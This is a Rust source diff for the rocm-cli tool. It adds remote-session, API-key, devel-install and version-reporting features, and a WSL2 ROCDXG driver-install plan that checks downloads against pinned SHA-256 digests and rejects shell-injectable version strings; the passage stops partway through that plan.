@@ -15,6 +15,7 @@ mod endpoint_keys;
 mod logging;
 mod provider_keys;
 mod providers;
+mod remote;
 mod serve_summary;
 mod storage;
 mod therock;
@@ -193,7 +194,8 @@ rocm agents omp --test                   Test OMP as a distinct harness")]
         #[arg(long)]
         device_index: Option<i64>,
     },
-    /// Print the rocm-cli version.
+    /// Print the rocm-cli version, release tag or branch, and commit hash,
+    /// plus the ROCm SDK and GPU driver this machine would use.
     Version,
     /// Generate a shell completion script for the given shell.
     Completions {
@@ -425,6 +427,16 @@ rocm serve qwen --verbose --device gpu_required")]
         /// Allow binding to a non-local address.
         #[arg(long)]
         allow_public_bind: bool,
+        /// Require an API key even on a loopback bind.
+        ///
+        /// Loopback serving is credential-free because only this machine can
+        /// reach it. That stops being true when something else republishes the
+        /// port — a tailnet publish, a reverse proxy, a container port map — at
+        /// which point the bind address no longer describes who can call it.
+        /// Pass this to keep the endpoint authenticated anyway. `rocm remote`
+        /// sets it on every session it starts.
+        #[arg(long)]
+        require_api_key: bool,
         /// vLLM tool-call parser to enable OpenAI tool calling for this model
         /// (e.g. `hermes`, `llama3_json`, `mistral`). Overrides any catalog default
         /// and implies `--enable-auto-tool-choice`. Applies to vLLM only.
@@ -460,8 +472,9 @@ rocm serve qwen --verbose --device gpu_required")]
         /// When binding a public interface and this is omitted, a strong key is
         /// generated automatically. Prefer the `ROCM_SERVE_API_KEY` environment
         /// variable over this flag so the secret does not appear in shell history
-        /// or the process table. Ignored for loopback binds, which stay
-        /// credential-free.
+        /// or the process table. Ignored for a loopback bind unless
+        /// `--require-api-key` is also passed, which makes a loopback endpoint
+        /// authenticated too.
         #[arg(long)]
         api_key: Option<String>,
     },
@@ -475,6 +488,11 @@ rocm serve qwen --verbose --device gpu_required")]
     Services {
         #[command(subcommand)]
         command: Option<ServicesCommand>,
+    },
+    /// [preview] Work with GPU machines on your tailnet.
+    Remote {
+        #[command(subcommand)]
+        command: remote::RemoteCommand,
     },
     /// [preview] Manage optional background checks and review requests.
     Automations {
@@ -617,7 +635,8 @@ enum InstallTarget {
     #[command(after_help = "EXAMPLES:\n  \
 rocm install sdk\n  \
 rocm install sdk --channel nightly --build-date 2025-01-15\n  \
-rocm install sdk --family gfx110X-all --dry-run")]
+rocm install sdk --family gfx110X-all --dry-run\n  \
+rocm install sdk --devel")]
     Sdk {
         /// Package channel to install, such as release or nightly.
         #[arg(long, default_value = "release")]
@@ -637,6 +656,18 @@ rocm install sdk --family gfx110X-all --dry-run")]
         /// TheRock GPU package family to install, such as gfx110X-all.
         #[arg(long)]
         family: Option<String>,
+        /// Also install the ROCm compiler, headers, and static libraries for
+        /// building GPU code. Roughly doubles the wheel download; already
+        /// included by `--format tarball`.
+        ///
+        /// This does not add the toolchain to a runtime you already have: a
+        /// runtime is identified by the packages it was installed from, so
+        /// passing --devel over an existing plain install of the same version
+        /// creates a SECOND side-by-side runtime and activates it. Remove the
+        /// one you do not want with `rocm runtimes uninstall <runtime-key>`;
+        /// `rocm runtimes list` shows which is which.
+        #[arg(long)]
+        devel: bool,
         /// Resolve the install plan without changing files.
         #[arg(long)]
         dry_run: bool,
@@ -804,12 +835,15 @@ enum StorageCommand {
     /// Remove older ROCm installs, keeping the most recent ones.
     #[command(name = "remove-old-installs", alias = "remove-old-runtimes")]
     RemoveOldInstalls {
-        /// How many recent installs to keep for each channel, format, and GPU family.
+        /// How many recent installs to keep for each channel, format, GPU
+        /// family, and toolchain choice.
         ///
         /// "Recent" means most recently installed, not highest version, so
         /// after a deliberate downgrade the older version counts as the newer
-        /// install. The one in use and the rollback target are always kept on
-        /// top of this count, whatever it is set to.
+        /// install. A `--devel` install and a plain one are separate runtimes
+        /// and get separate counts, so a newer runtime-only install never
+        /// evicts the toolchain. The one in use and the rollback target are
+        /// always kept on top of this count, whatever it is set to.
         #[arg(long, default_value_t = storage::DEFAULT_KEEP)]
         keep: usize,
         /// Show what would happen without changing files.
@@ -882,13 +916,27 @@ enum ComfyuiCommand {
     },
 }
 
+// The doc comments below are `--help` output, one of the four user-facing
+// surfaces that describe these commands. When a command's flags, defaults,
+// arguments, or observable behaviour change here, change the other three in the
+// same commit too (AGENTS.md section 5): README.md, docs/testing.md, and
+// docs/manual-testing.md. `--help` is the one most often left behind, because
+// it is the only one of the four that is not a Markdown file.
 #[derive(Subcommand, Debug)]
 enum ServicesCommand {
-    /// Show currently running local model servers.
+    /// Show currently running local model servers, and count the records that
+    /// are no longer running.
     List {
         /// Include failed, stopped, and old service records.
         #[arg(short, long)]
         all: bool,
+        /// Emit the service records as JSON instead of a table.
+        ///
+        /// This is the machine-readable form `rocm remote` reads back over its
+        /// control channel to discover which service a remote `rocm serve` just
+        /// started, rather than scraping the human table.
+        #[arg(long)]
+        json: bool,
     },
     /// Show logs for a local model server.
     Logs {
@@ -928,6 +976,11 @@ enum ServicesCommand {
     ///
     /// Running servers are always left alone. Leftover files whose record is
     /// already gone are cleaned up too.
+    ///
+    /// Waits for a managed launch already under way to publish its record
+    /// before reading the directory, and waits as long as that launch takes.
+    /// There is no timeout. On an interactive terminal it says so while it
+    /// waits; piped or redirected output stays silent.
     Prune {
         /// Only remove records and files untouched for at least this many hours.
         ///
@@ -1377,7 +1430,8 @@ fn run() -> Result<()> {
 }
 
 /// Build the root `rocm` command with its top-level subcommands ordered
-/// alphabetically in `--help` output (EAI-7362).
+/// alphabetically in `--help` output (EAI-7362), and `-V`/`--version` reporting
+/// the same traceable string as `rocm version` (see [`cli_version_string`]).
 ///
 /// clap assigns each subcommand an incrementing display order in declaration
 /// order and renders the command list sorted by `(display_order, name)`.
@@ -1389,14 +1443,23 @@ fn run() -> Result<()> {
 /// subcommand *after* this runs and leaves it at that default, so matching the
 /// default here lets `help` sort into its alphabetical position instead of being
 /// pinned last. The regression test guards this if clap's default ever changes.
+///
+/// `display_name` only changes what `-V`/`--version` prints ahead of the
+/// version string — verified against `--help`'s `Usage:` line and `completions`
+/// output, both of which are generated from `Cli::command()` directly and so
+/// bypass this override.
 fn cli_command() -> clap::Command {
-    Cli::command().mut_subcommands(|sc| sc.display_order(999usize))
+    Cli::command()
+        .mut_subcommands(|sc| sc.display_order(999usize))
+        .version(cli_version_string())
+        .display_name("rocm-cli")
 }
 
 /// Parse process arguments through [`cli_command`] so `rocm --help` and
-/// `rocm help` list subcommands alphabetically. Mirrors the derived
-/// `Cli::parse()`, which builds from `Cli::command()` directly and therefore
-/// cannot pick up the reordering.
+/// `rocm help` list subcommands alphabetically and `rocm -V`/`--version` print
+/// the traceable version string. Mirrors the derived `Cli::parse()`, which
+/// builds from `Cli::command()` directly and therefore cannot pick up either
+/// override.
 ///
 /// Returns a [`ClapExitCode`]-carrying error instead of calling
 /// `clap::Error::exit()` directly, so `run()`'s caller can unwrap the code
@@ -1407,6 +1470,60 @@ fn cli_command() -> clap::Command {
 fn parse_cli() -> Result<Cli> {
     let matches = cli_command().try_get_matches().map_err(clap_exit_code)?;
     Cli::from_arg_matches(&matches).map_err(clap_exit_code)
+}
+
+/// What every version-reporting surface (`-V`/`--version`, `rocm version`, and
+/// the MCP in-process handler) prints: the semantic version Cargo built, plus
+/// the git ref and commit hash [`build.rs`] embedded, additively — never a
+/// replacement, so a build with an "unknown" ref (no tag, no branch, no git)
+/// still reports a real version number rather than none at all.
+fn cli_version_string() -> String {
+    format!(
+        "{} ({}, {})",
+        env!("CARGO_PKG_VERSION"),
+        env!("ROCM_CLI_VERSION_REF"),
+        env!("ROCM_CLI_GIT_HASH")
+    )
+}
+
+/// `rocm version`: the traceable build string, plus the ROCm SDK and GPU
+/// driver this machine would actually use -- unlike `-V`/`--version` and the
+/// MCP fast path, which stay a single terse line for scripts and in-process
+/// callers.
+///
+/// "The ROCm SDK" prefers the active managed TheRock runtime (what `rocm`
+/// itself runs engines against), falling back to a detected but unmanaged
+/// system ROCm install -- the same precedence `rocm`'s freeform "ROCm status"
+/// answer already uses, just without its other, heavier probing.
+fn version() -> Result<()> {
+    println!("rocm-cli {}", cli_version_string());
+
+    let paths = AppPaths::discover()?;
+    let config = RocmCliConfig::load(&paths).unwrap_or_default();
+    let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+    match current_runtime_manifest(&config, &manifests) {
+        Some(manifest) => println!(
+            "ROCm SDK: {} ({})",
+            therock::runtime_version_display(&manifest.version),
+            manifest.install_root.display()
+        ),
+        None => match rocm_core::detect_legacy_rocm_sdk() {
+            Some((version, path)) => {
+                println!(
+                    "ROCm SDK: {version} (unmanaged install at {})",
+                    path.display()
+                );
+            }
+            None => println!("ROCm SDK: not detected"),
+        },
+    }
+
+    match rocm_core::detect_gpu_driver_version() {
+        Some(version) => println!("GPU driver: {version}"),
+        None => println!("GPU driver: not detected"),
+    }
+
+    Ok(())
 }
 
 /// Legacy `uv` cache location, used before the cache was colocated with the managed
@@ -2007,10 +2124,7 @@ fn dispatch(cli: Cli) -> Result<()> {
             dry_run,
             device_index,
         }) => fix(fix_id, yes, dry_run, device_index),
-        Some(Command::Version) => {
-            println!("rocm {}", env!("CARGO_PKG_VERSION"));
-            Ok(())
-        }
+        Some(Command::Version) => version(),
         Some(Command::Setup { command }) => setup(command),
         Some(Command::EngineServeHttp {
             engine,
@@ -2301,6 +2415,7 @@ fn dispatch(cli: Cli) -> Result<()> {
             verbose,
             no_smoke_test,
             allow_public_bind,
+            require_api_key,
             tool_call_parser,
             gpu_memory_utilization,
             temperature,
@@ -2321,6 +2436,7 @@ fn dispatch(cli: Cli) -> Result<()> {
             verbose,
             no_smoke_test,
             allow_public_bind,
+            require_api_key,
             tool_call_parser,
             gpu_memory_utilization,
             temperature,
@@ -2330,6 +2446,7 @@ fn dispatch(cli: Cli) -> Result<()> {
         }),
         Some(Command::Comfyui { command }) => comfyui(command),
         Some(Command::Services { command }) => services(command),
+        Some(Command::Remote { command }) => remote::run(command),
         Some(Command::Automations { command }) => automations(command),
         Some(Command::Agents { args }) => agents::run(args),
         Some(Command::Config { command }) => config(command),
@@ -2473,6 +2590,9 @@ fn strip_subcommands(cmd: clap::Command) -> clap::Command {
     if let Some(long_version) = cmd.get_long_version() {
         bare = bare.long_version(long_version.to_owned());
     }
+    if let Some(display_name) = cmd.get_display_name() {
+        bare = bare.display_name(display_name.to_owned());
+    }
     for alias in cmd.get_visible_aliases() {
         bare = bare.visible_alias(alias.to_owned());
     }
@@ -2593,6 +2713,20 @@ struct ExamineJsonSummary<'a> {
     active_runtime_id: Option<&'a str>,
     active_runtime_key: Option<&'a str>,
     previous_runtime_key: Option<&'a str>,
+    /// Where the active runtime lives, completing the `id`/`key`/`root` triple.
+    /// Not derivable from the key: `install_root` is its own field on the
+    /// manifest, and `install sdk --prefix`, `runtimes adopt` and `runtimes
+    /// import` all set it freely.
+    active_runtime_root: Option<String>,
+    /// The folder setup was configured for, straight from config. Distinct from
+    /// `active_runtime_root`, not a fallback for it: setup's folder can be a
+    /// stale or removed install while a different runtime is active. Reachable
+    /// without the registry, which is what makes it worth carrying — see
+    /// `recover_setup_runtime_registration`, the write `--json` will not do.
+    setup_runtime_root: Option<String>,
+    /// The text form's sibling fact, derived from `setup_runtime_root` rather
+    /// than stored, so it cannot drift from where the pip cache actually goes.
+    setup_runtime_pip_cache_dir: Option<String>,
 }
 
 fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
@@ -2615,6 +2749,15 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
         // in a loop.
         let host = ExamineSummary::gather()?;
         let configured_default_engine = config.default_engine.as_deref();
+        // Same resolution the human report uses, minus the recovery write above:
+        // an unreadable registry leaves the root `null` rather than failing the
+        // inspection, which is the weaker answer but still an answer.
+        let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+        let active_runtime_root = current_runtime_manifest(&config, &manifests)
+            .map(|manifest| manifest.install_root.display().to_string());
+        let (setup_runtime_root, setup_runtime_pip_cache_dir) = setup_runtime_paths(&config)
+            .map(|(root, cache)| (root.display().to_string(), cache.display().to_string()))
+            .unzip();
         let document = ExamineJson {
             examination: &examination,
             summary: ExamineJsonSummary {
@@ -2623,6 +2766,9 @@ fn examine(json: bool, framework: rocm_core::FrameworkProbe) -> Result<()> {
                 active_runtime_id: config.default_runtime_id.as_deref(),
                 active_runtime_key: config.active_runtime_key.as_deref(),
                 previous_runtime_key: config.previous_runtime_key.as_deref(),
+                active_runtime_root,
+                setup_runtime_root,
+                setup_runtime_pip_cache_dir,
                 host: &host,
             },
         };
@@ -2842,6 +2988,7 @@ fn install(target: InstallTarget) -> Result<()> {
             channel,
             format,
             prefix,
+            devel,
             version,
             build_date,
             family,
@@ -2864,13 +3011,16 @@ fn install(target: InstallTarget) -> Result<()> {
                 .map_or_else(|| "<managed>".to_owned(), |path| path.display().to_string());
             match therock::install_sdk(
                 &paths,
-                &channel,
-                format_name,
-                prefix,
-                version_selector,
-                family.as_deref(),
-                dry_run,
-                consents.replace_active_default,
+                sdk_install_request(
+                    &channel,
+                    format_name,
+                    prefix,
+                    version_selector,
+                    family.as_deref(),
+                    dry_run,
+                    devel,
+                    consents.replace_active_default,
+                ),
             ) {
                 Ok(result) => {
                     let therock::SdkInstallResult { output, mutated } = result;
@@ -3047,7 +3197,7 @@ fn install_driver(
         pre_driver: examine.driver,
         post_driver: None,
         boot_id_at_execution: boot_id,
-        reboot_required: false,
+        reboot_required: plan.reboot_required,
         reboot_observed: false,
         commands: plan.execution_commands(),
         reconciled_at_unix_ms: None,
@@ -3056,36 +3206,54 @@ fn install_driver(
     write_driver_install_state(paths, &state)
         .map_err(|source| DriverInstallError::new(source, false))?;
 
-    for command in &plan.commands {
-        if !matches!(
-            command.phase,
-            DriverCommandPhase::Prepare | DriverCommandPhase::Execute
-        ) {
-            continue;
-        }
-        run_driver_shell_command(&command.command)
-            .with_context(|| format!("driver command failed: {}", command.command))
-            .map_err(|source| DriverInstallError::new(source, true))?;
-    }
-
-    let post_driver = ExamineSummary::gather()
-        .map_err(|source| DriverInstallError::new(source, true))?
-        .driver;
-    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
-    state.post_driver = Some(post_driver);
-    state.reboot_required = true;
-    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
-    write_driver_install_state(paths, &state)
-        .map_err(|source| DriverInstallError::new(source, true))?;
+    execute_driver_install_plan(
+        &plan,
+        &mut state,
+        run_driver_shell_command,
+        |state| write_driver_install_state(paths, state),
+        || ExamineSummary::gather().map(|summary| summary.driver),
+    )
+    .map_err(|source| DriverInstallError::new(source, true))?;
 
     let report = cli_report::ActionReport::new("driver install completed")
-        .detail("reboot_required", true)
+        .detail("reboot_required", plan.reboot_required)
         .detail("state", driver_install_state_path(paths).display());
     output.push_str(&report.render());
     Ok(DriverInstallResult {
         output,
         executed: true,
     })
+}
+
+fn execute_driver_install_plan<Run, Persist, Gather>(
+    plan: &DriverInstallPlan,
+    state: &mut DriverInstallState,
+    mut run: Run,
+    mut persist: Persist,
+    gather_post_driver: Gather,
+) -> Result<()>
+where
+    Run: FnMut(&str) -> Result<()>,
+    Persist: FnMut(&DriverInstallState) -> Result<()>,
+    Gather: FnOnce() -> Result<rocm_core::DriverSummary>,
+{
+    for command in &plan.commands {
+        if plan.reboot_required && command.phase == DriverCommandPhase::Verify {
+            continue;
+        }
+        run(&command.command)
+            .with_context(|| format!("driver command failed: {}", command.command))?;
+    }
+
+    state.executed_at_unix_ms = Some(rocm_core::unix_time_millis());
+    state.reboot_required = plan.reboot_required;
+    state.reboot_observed = driver_reboot_observed(state.boot_id_at_execution.as_deref());
+    persist(state)?;
+
+    let post_driver = gather_post_driver()?;
+    state.post_driver = Some(post_driver);
+    persist(state)?;
+    Ok(())
 }
 
 fn reconcile_driver_install(paths: &AppPaths) -> Result<String> {
@@ -3124,7 +3292,6 @@ fn reconcile_driver_install_state(
         .zip(current_boot_id.as_deref())
         .is_some_and(|(executed, current)| executed != current);
     state.reboot_observed = reboot_observed;
-    state.reboot_required = state.reboot_required || state.executed_at_unix_ms.is_some();
     state.post_driver = Some(driver.clone());
     let at_unix_ms = rocm_core::unix_time_millis();
     state.reconciled_at_unix_ms = Some(at_unix_ms);
@@ -3307,6 +3474,13 @@ struct DriverInstallPlan {
     preflight_checks: Vec<String>,
     commands: Vec<DriverPlanCommand>,
     checks: Vec<String>,
+    /// Whether the host must reboot before the verification steps mean anything.
+    ///
+    /// True for the kernel-module paths: an amdgpu DKMS build is not live until
+    /// the machine comes back up. False on WSL2, where nothing kernel-side
+    /// changes — ROCDXG is a userspace library and `ldconfig` publishes it
+    /// immediately, so telling the user to reboot would be wrong.
+    reboot_required: bool,
 }
 
 impl DriverInstallPlan {
@@ -3429,6 +3603,343 @@ struct DriverPassiveCheck {
     detail: String,
 }
 
+/// Release of ROCDXG installed on WSL2, overridable for trying another build.
+///
+/// Resolved once at plan-build time via [`resolve_shell_default_template`], the
+/// same way `ROCM_CLI_AMDGPU_VERSION` is handled for the bare-metal repository
+/// pin. The concrete value is baked into the archive name, the release URL and
+/// the `repo_version:` line, so the plan a user reviews names the build the
+/// install will actually fetch rather than an unexpanded `${...}` placeholder.
+///
+/// How the default is chosen: the newest non-prerelease `librocdxg` release
+/// whose `rocdxg-roct` digest is pinned in [`ROCDXG_PINNED_DIGESTS`]. Moving it
+/// is two edits — add the `(version, digest)` row to that table, then change
+/// the literal here — and the two must move together: a default with no row
+/// makes [`resolve_rocdxg_verification`] refuse to build a plan at all unless
+/// the caller supplies a digest, so a bump that forgets the table breaks every
+/// default WSL install rather than falling back to the previous release.
+///
+/// Deliberately out of scope: `rocdxg-amd-smi-lib_<version>_amd64.deb`, which
+/// v1.2.1 and v1.2.2 ship alongside `rocdxg-roct` and the five releases before
+/// them do not, is not installed here. It is a second prefix under
+/// `/opt/rocm-wsl` carrying its own `amd-smi` and `libamd_smi.so`, and it
+/// installs an `/etc/profile.d` entry that sources the package's own
+/// `/opt/rocm-wsl/.env.sh`, which in turn prepends that prefix to `PATH` and
+/// `LD_LIBRARY_PATH` for new login shells. That is a system-wide environment
+/// change in service of a monitoring utility that neither `wsl_rocdxg_ready`
+/// nor `rocm serve` depends on, and it is not available for every version in
+/// the pinned table. Installing it is a separate decision that belongs behind
+/// its own opt-in, not folded into the plan whose job is to supply the runtime
+/// bridge.
+const ROCDXG_VERSION_EXPR: &str = "${ROCM_CLI_ROCDXG_VERSION:-1.2.2}";
+
+/// Supplies a SHA-256 digest for the ROCDXG package, overriding the pinned one.
+/// Required when installing a version this build has no digest for.
+const ROCDXG_SHA256_ENV: &str = "ROCM_CLI_ROCDXG_SHA256";
+
+/// Opts out of digest verification entirely, when set to an affirmative value.
+/// Named explicitly so that shipping an unverified root install is a deliberate
+/// act with an audit trail in the plan, rather than what happens when a variable
+/// is simply unset.
+const ROCDXG_ALLOW_UNVERIFIED_ENV: &str = "ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED";
+
+/// SHA-256 digests of the `rocdxg-roct` package shipped with each published
+/// ROCDXG release, taken from the release host's own asset metadata.
+///
+/// These exist so the default install is authenticated. The package is fetched
+/// over plain HTTPS from a release page and then handed to `apt-get install`,
+/// which runs its maintainer scripts as root — so without a digest, TLS to the
+/// download host is the only thing standing between a compromised or swapped
+/// artifact and root on the user's machine. That is materially weaker than the
+/// bare-metal apt path in this same file, which installs from a repository
+/// pinned with `signed-by=/etc/apt/keyrings/rocm.gpg`.
+///
+/// A version absent from this table is not installed unless the caller supplies
+/// a digest via `ROCM_CLI_ROCDXG_SHA256` or opts out via
+/// `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`; see [`resolve_rocdxg_verification`].
+/// Add the new pair here when pinning a newer release. Nothing in the tree
+/// checks a row against the published artifact, so a mistyped digest surfaces
+/// only as a failed install on a WSL host — fail-closed, but confusing. Take
+/// the value from the release's own asset metadata, or recompute it:
+///
+/// ```text
+/// curl -L --fail \
+///   https://github.com/ROCm/librocdxg/releases/download/v<version>/rocdxg-roct_<version>_amd64.deb \
+///   | sha256sum
+/// ```
+const ROCDXG_PINNED_DIGESTS: &[(&str, &str)] = &[
+    (
+        "1.0.0",
+        "5e78d300dfb8c10dfd57de24b312ff9f9962a3a971f571e5e9383e1c543b607a",
+    ),
+    (
+        "1.1.0",
+        "d1f92415d218ca10df3c39f2ce48872ee968549a97191e987f2c2a79ab709f23",
+    ),
+    (
+        "1.1.1",
+        "cd2ba9dbfd32bf35755a45e7e92410524f32baa2b4dcc31d0106876d04c3abcc",
+    ),
+    (
+        "1.1.2",
+        "e426a5f58f4f177512a354ed5f0dd7b2c0a2b736f009e09bf806edf18ca6cb97",
+    ),
+    (
+        "1.2.0",
+        "3ed9526719290cd8f590150dad8ea0f234fa779bea6a4c9a8449d7ae6b8cfb6e",
+    ),
+    (
+        "1.2.1",
+        "7889eef45a1132ed2dde88d8ea1356bf791ec9c05802a18940bc81b970e850e0",
+    ),
+    (
+        "1.2.2",
+        "28ded1254811192ebace1f76c0227580184af7b27ab2475fb9728295a702d541",
+    ),
+];
+
+/// Whether a resolved ROCDXG version is safe to place in the plan's commands.
+///
+/// The driver plan is a list of shell lines run through `sh -c`, and the
+/// version is interpolated into three of them — the archive name, the release
+/// URL and the local path — each of which is then executed with `sudo` already
+/// primed by an earlier `apt-get update`. `ROCM_CLI_ROCDXG_VERSION` reaches
+/// this unchanged from the environment, so a value containing `;` or a
+/// backtick would otherwise end the intended command and start an attacker's
+/// own. Restricting it to characters that appear in a Debian package version
+/// removes the possibility rather than trying to escape it.
+fn rocdxg_version_is_well_formed(version: &str) -> bool {
+    !version.is_empty()
+        && version.starts_with(|c: char| c.is_ascii_alphanumeric())
+        && version
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '+' | '-' | '~'))
+}
+
+/// Whether a string is a bare lowercase 64-character hex SHA-256 digest, the
+/// form `sha256sum -c -` expects.
+fn sha256_digest_is_well_formed(digest: &str) -> bool {
+    digest.len() == 64 && digest.chars().all(|c| c.is_ascii_hexdigit())
+}
+
+/// How the downloaded ROCDXG package will be authenticated before it is
+/// installed as root.
+#[derive(Debug, Clone, Eq, PartialEq)]
+enum RocdxgVerification {
+    /// Check the download against this digest and abort the install on a
+    /// mismatch.
+    Digest(String),
+    /// Install without checking, because the caller explicitly asked for it.
+    OptedOut,
+}
+
+/// Decide how a ROCDXG download will be authenticated, or `Err` with the reason
+/// no plan can be built.
+///
+/// Resolution order — an explicit digest wins over the pinned one so a user can
+/// install an artifact this build predates without having to disable
+/// verification wholesale:
+///
+/// 1. `ROCM_CLI_ROCDXG_SHA256`, when it is a well-formed digest.
+/// 2. The digest pinned for this version in [`ROCDXG_PINNED_DIGESTS`].
+/// 3. `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED`, when set to an affirmative value
+///    — see [`crate::therock::truthy_env`] for the exact allowlist — which opts
+///    out. `0` and `false` do not.
+///
+/// Nothing left means refusal. Verification is therefore opt-*out*: the failure
+/// mode of an unset variable is a plan that will not run, not a root install of
+/// an unauthenticated package.
+fn resolve_rocdxg_verification(version: &str) -> Result<RocdxgVerification, String> {
+    if let Some(supplied) = std::env::var(ROCDXG_SHA256_ENV)
+        .ok()
+        .map(|value| value.trim().to_ascii_lowercase())
+        .filter(|value| !value.is_empty())
+    {
+        if !sha256_digest_is_well_formed(&supplied) {
+            return Err(format!(
+                "{ROCDXG_SHA256_ENV} is not a 64-character hex SHA-256 digest; refusing to install ROCDXG without a usable digest."
+            ));
+        }
+        return Ok(RocdxgVerification::Digest(supplied));
+    }
+
+    if let Some(pinned) = ROCDXG_PINNED_DIGESTS
+        .iter()
+        .find_map(|(pinned_version, digest)| (*pinned_version == version).then_some(*digest))
+    {
+        return Ok(RocdxgVerification::Digest(pinned.to_owned()));
+    }
+
+    // An allowlist of affirmative values, not "set to anything non-empty":
+    // otherwise `ROCM_CLI_ROCDXG_ALLOW_UNVERIFIED=0` — which every reader takes
+    // for "off" — would turn digest checking off for a package installed as
+    // root. Anything this does not recognise leaves verification on.
+    if crate::therock::truthy_env(ROCDXG_ALLOW_UNVERIFIED_ENV) {
+        return Ok(RocdxgVerification::OptedOut);
+    }
+
+    Err(format!(
+        "no known SHA-256 digest for ROCDXG {version}, and this package is installed as root. Set {ROCDXG_SHA256_ENV} to the digest published with that release, or set {ROCDXG_ALLOW_UNVERIFIED_ENV}=1 to install without verifying it."
+    ))
+}
+
+/// A WSL plan that cannot be run, carrying the reason in the same shape every
+/// other unsupported plan uses so `--dry-run`, the approval prompt and
+/// `state.json` all report it identically.
+fn wsl_rocdxg_refusal_plan(repo_version: String, reason: String) -> DriverInstallPlan {
+    DriverInstallPlan {
+        supported: false,
+        mutating: false,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version,
+        reason,
+        preflight_checks: Vec::new(),
+        commands: Vec::new(),
+        checks: vec!["rocm examine".to_owned(), "rocm diagnose".to_owned()],
+        reboot_required: false,
+    }
+}
+
+/// The `rocm install driver` plan for a WSL2 host.
+///
+/// WSL2 has no in-tree amdgpu driver to install: the GPU comes from the Windows
+/// host driver through `/dev/dxg`, and what ROCm needs on the Linux side is
+/// ROCDXG (`librocdxg`), which bridges the runtime to it. Without that library
+/// `rocm examine` reports `wsl_rocdxg_missing` and `rocm serve` refuses with
+/// "no usable AMD GPU detected", even though a gfx target is detected — the
+/// target is read from the Windows-side driver.
+///
+/// This used to be a refusal pointing at a shell script under `scripts/`, which
+/// ships only in a git checkout — never in the release bundle — so it was a dead
+/// end for anyone who installed the CLI normally. These are that script's steps;
+/// it has been removed rather than left as a second, untested copy of them.
+fn wsl_rocdxg_driver_plan(escalation: PrivilegeEscalation) -> DriverInstallPlan {
+    let version = resolve_shell_default_template(ROCDXG_VERSION_EXPR);
+    if !rocdxg_version_is_well_formed(&version) {
+        return wsl_rocdxg_refusal_plan(
+            // The rejected value is still rendered into the plan's
+            // `repo_version:` line so the user can see what was refused — but
+            // that line is part of a plan a human reads to decide, and a raw
+            // value containing a newline could forge further lines in it. The
+            // debug form escapes newlines and makes trailing space visible,
+            // which is exactly what is wanted for a value being shown as
+            // rejected.
+            format!("{version:?}"),
+            "ROCM_CLI_ROCDXG_VERSION is not a well-formed package version. It is interpolated into privileged shell commands, so only letters, digits, and `. + - ~` are accepted.".to_owned(),
+        );
+    }
+    let verification = match resolve_rocdxg_verification(&version) {
+        Ok(verification) => verification,
+        Err(reason) => return wsl_rocdxg_refusal_plan(version, reason),
+    };
+
+    let sudo = escalation.prefix();
+    let deb = format!("rocdxg-roct_{version}_amd64.deb");
+    let url = format!("https://github.com/ROCm/librocdxg/releases/download/v{version}/{deb}");
+    let deb_path = format!("/tmp/{deb}");
+    // `version` is validated above and the digest is hex, so neither can carry
+    // shell metacharacters; the quotes keep that guarantee local to the command
+    // rather than resting on a check several functions away.
+    let verify_download = match &verification {
+        RocdxgVerification::Digest(digest) => driver_command(
+            DriverCommandPhase::Execute,
+            &format!("printf '%s  %s\\n' '{digest}' '{deb_path}' | sha256sum -c -"),
+        ),
+        RocdxgVerification::OptedOut => driver_command(
+            DriverCommandPhase::Execute,
+            &format!(
+                "echo 'warning: installing ROCDXG {version} without verifying it ({ROCDXG_ALLOW_UNVERIFIED_ENV} is set)' >&2"
+            ),
+        ),
+    };
+    DriverInstallPlan {
+        supported: true,
+        mutating: true,
+        policy: "wsl_rocdxg".to_owned(),
+        os_id: "wsl".to_owned(),
+        version_id: String::new(),
+        codename: String::new(),
+        repo_version: version,
+        reason:
+            "WSL2 uses the Windows host driver plus ROCDXG, not Linux DKMS; this installs ROCDXG."
+                .to_owned(),
+        // Read, not run: the GPU plumbing belongs to the WSL platform, so if it
+        // is absent the fix is on the Windows side and no Linux package helps.
+        // The Execute phase fails on the same two paths rather than installing
+        // a library with nothing to bind to.
+        preflight_checks: {
+            let mut checks = vec![
+                "/dev/dxg (WSL GPU device)".to_owned(),
+                "/usr/lib/wsl/lib/libdxcore.so (WSL dxcore runtime)".to_owned(),
+            ];
+            checks.extend(driver_root_preflight_checks(escalation));
+            checks
+        },
+        commands: vec![
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /dev/dxg || { echo 'error: /dev/dxg is missing; WSL GPU plumbing is not available' >&2; exit 1; }",
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                "test -e /usr/lib/wsl/lib/libdxcore.so || { echo 'error: /usr/lib/wsl/lib/libdxcore.so is missing' >&2; exit 1; }",
+            ),
+            // Say why up front rather than letting the first privileged step die
+            // with `sudo: command not found`, which reads like a broken plan.
+            // Skipped when already root: the plan emits no `sudo` at all then,
+            // so demanding the binary would state a precondition it is not
+            // relying on.
+            driver_command(
+                DriverCommandPhase::Prepare,
+                if escalation.needs_sudo_binary() {
+                    "command -v sudo >/dev/null 2>&1 || { echo 'error: sudo is required to install ROCDXG under /opt/rocm' >&2; exit 1; }"
+                } else {
+                    "test \"$(id -u)\" -eq 0 || { echo 'error: this plan was built to run as root' >&2; exit 1; }"
+                },
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get update"),
+            ),
+            driver_command(
+                DriverCommandPhase::Prepare,
+                &format!("{sudo}apt-get install -y ca-certificates curl"),
+            ),
+            driver_command(
+                DriverCommandPhase::Execute,
+                &format!("curl -L --fail --show-error --output '{deb_path}' '{url}'"),
+            ),
+            // Authenticating the download is the whole trust anchor for this
+            // plan: everything after it runs the package's maintainer scripts
+            // as root. `sha256sum -c -` exits non-zero on a mismatch, which
+            // aborts the plan before the install step.
+            verify_download,
+            driver_command(
+                DriverCommandPhase::Execute,
